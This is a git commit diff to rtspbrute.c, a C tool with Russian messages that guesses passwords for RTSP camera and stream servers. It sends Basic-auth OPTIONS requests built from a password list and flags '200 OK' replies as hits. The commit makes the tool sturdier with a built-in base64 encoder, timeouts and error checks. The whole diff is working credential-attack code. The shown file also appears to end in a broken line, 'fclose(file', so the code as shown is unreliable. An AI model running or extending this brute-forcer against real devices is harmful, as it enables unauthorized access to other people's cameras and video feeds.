d35df3d7bae40cc4cf79f81738dd1229c00247f2
Dr <146625050+AnonimusShamshiAlex@users.noreply.github.com>
2025-04-25 12:31:24 +0500

    Update rtspbrute.c

--- rtspbrute.c
+++ rtspbrute.c
@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <signal.h>
 #include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/time.h>
 
 #define BUFFER_SIZE 2048
 #define PASSWORD_LENGTH 100
@@ -16,25 +18,32 @@ void handle_interrupt(int sig) {
     printf("\n\033[1;33m[!] Прерывание! Завершение программы...\033[0m\n");
 }
 
-// Кодирование в Base64
-char *base64_encode(const char *input) {
-    char command[BUFFER_SIZE];
-    char *result = malloc(BUFFER_SIZE);
-    FILE *fp;
+// Простое Base64 (без popen)
+static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-    snprintf(command, sizeof(command), "echo -n \"%s\" | base64", input);
-    fp = popen(command, "r");
-    if (!fp) {
-        perror("Ошибка запуска base64");
-        free(result);
-        return NULL;
+char *base64_encode(const char *data) {
+    size_t len = strlen(data);
+    char *encoded = malloc(((len + 2) / 3) * 4 + 1);
+    if (!encoded) return NULL;
+
+    unsigned char input[3];
+    char *out = encoded;
+    size_t i;
+
+    for (i = 0; i < len;) {
+        size_t j = 0;
+        while (j < 3) {
+            input[j++] = (i < len) ? data[i++] : 0;
+        }
+
+        *out++ = base64_table[(input[0] & 0xfc) >> 2];
+        *out++ = base64_table[((input[0] & 0x03) << 4) | ((input[1] & 0xf0) >> 4)];
+        *out++ = (j > 1) ? base64_table[((input[1] & 0x0f) << 2) | ((input[2] & 0xc0) >> 6)] : '=';
+        *out++ = (j > 2) ? base64_table[input[2] & 0x3f] : '=';
     }
 
-    fgets(result, BUFFER_SIZE, fp);
-    result[strcspn(result, "\n")] = '\0';
-
-    pclose(fp);
-    return result;
+    *out = '\0';
+    return encoded;
 }
 
 // Попытка аутентификации
@@ -47,7 +56,10 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
 
     snprintf(userpass, sizeof(userpass), "%s:%s", username, password);
     char *auth_encoded = base64_encode(userpass);
-    if (!auth_encoded) return 0;
+    if (!auth_encoded) {
+        fprintf(stderr, "Ошибка кодирования Base64\n");
+        return 0;
+    }
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -56,9 +68,23 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
         return 0;
     }
 
+    // Таймауты
+    struct timeval timeout;
+    timeout.tv_sec = 5;
+    timeout.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
+
+    memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(target_port);
-    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
+
+    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
+        fprintf(stderr, "Неверный IP-адрес: %s\n", target_ip);
+        close(sock);
+        free(auth_encoded);
+        return 0;
+    }
 
     if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Ошибка подключения");
@@ -70,12 +96,27 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
     snprintf(request, sizeof(request),
              "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
              "CSeq: 1\r\n"
-             "Authorization: Basic %s\r\n\r\n",
+             "Authorization: Basic %s\r\n"
+             "User-Agent: Bruteforcer\r\n"
+             "Accept: */*\r\n\r\n",
              target_ip, auth_encoded);
 
-    send(sock, request, strlen(request), 0);
-    recv(sock, response, sizeof(response) - 1, 0);
-    response[sizeof(response) - 1] = '\0';
+    if (send(sock, request, strlen(request), 0) < 0) {
+        perror("Ошибка отправки запроса");
+        close(sock);
+        free(auth_encoded);
+        return 0;
+    }
+
+    int received = recv(sock, response, sizeof(response) - 1, 0);
+    if (received < 0) {
+        perror("Ошибка получения ответа");
+        close(sock);
+        free(auth_encoded);
+        return 0;
+    }
+
+    response[received] = '\0';
 
     if (strstr(response, "200 OK")) {
         printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);
@@ -131,6 +172,4 @@ int main() {
         sleep(1);
     }
 
-    fclose(file);
-    return 0;
-}
+    fclose(file
